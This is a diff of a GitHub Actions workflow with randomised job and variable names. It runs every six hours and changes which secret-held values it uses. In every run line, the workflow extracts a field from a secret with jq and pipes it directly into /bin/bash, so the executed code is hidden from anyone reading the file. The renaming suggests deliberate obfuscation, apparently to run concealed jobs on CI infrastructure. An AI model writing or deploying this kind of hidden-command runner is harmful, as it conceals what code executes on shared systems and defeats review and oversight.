@@ -1,36 +1,26 @@
 name: huarukui7615
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 1/6 * * *'
+    - cron: '12 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: huarukui7615
         env:
-          umd372: ${{ secrets.umd372 }}
+          z6: ${{ secrets.z6 }}
         run: |
-          echo $umd372 | jq -r .hcm43081 | /bin/bash
-          echo $wzn3146 | jq -r .ha0 | /bin/bash
-          echo $zkvq4250 | jq -r .okr9 | /bin/bash
-          echo $bzwxi05246 | jq -r .ihj8628 | /bin/bash
-          echo $sxwct5 | jq -r .zvd282 | /bin/bash
-          echo $lobg62770 | jq -r .itsb37 | /bin/bash
-          echo $xihok29 | jq -r .fxyy776 | /bin/bash
-          echo $cdqm4431 | jq -r .db5661 | /bin/bash
-          echo $osj26 | jq -r .z31925 | /bin/bash
-          echo $rl8 | jq -r .c7 | /bin/bash
-          echo $ea424 | jq -r .de62954 | /bin/bash
-          echo $gfz2727 | jq -r .ofbbw1 | /bin/bash
-          echo $ogxe63906 | jq -r .p659 | /bin/bash
-          echo $jsoj147 | jq -r .wealo3881 | /bin/bash
-          echo $ah4 | jq -r .frae967 | /bin/bash
-          echo $jvu82 | jq -r .a11986 | /bin/bash
-          echo $cljdx05 | jq -r .c84 | /bin/bash
-          echo $yrbho1316 | jq -r .oagn7302 | /bin/bash
-          echo $aycqx876 | jq -r .pmli60 | /bin/bash
+          echo $z6 | jq -r .uc19 | /bin/bash
+          echo $hhtr40 | jq -r .k35 | /bin/bash
+          echo $sison25112 | jq -r .kur9008 | /bin/bash
+          echo $jqhp7261 | jq -r .zh26 | /bin/bash
+          echo $v5 | jq -r .mtton2 | /bin/bash
+          echo $qo3448 | jq -r .ruk36 | /bin/bash
+          echo $fw10 | jq -r .degh3 | /bin/bash
+          echo $dfpee23 | jq -r .iwnwq5499 | /bin/bash
+          echo $dj936 | jq -r .lfs71 | /bin/bash
 
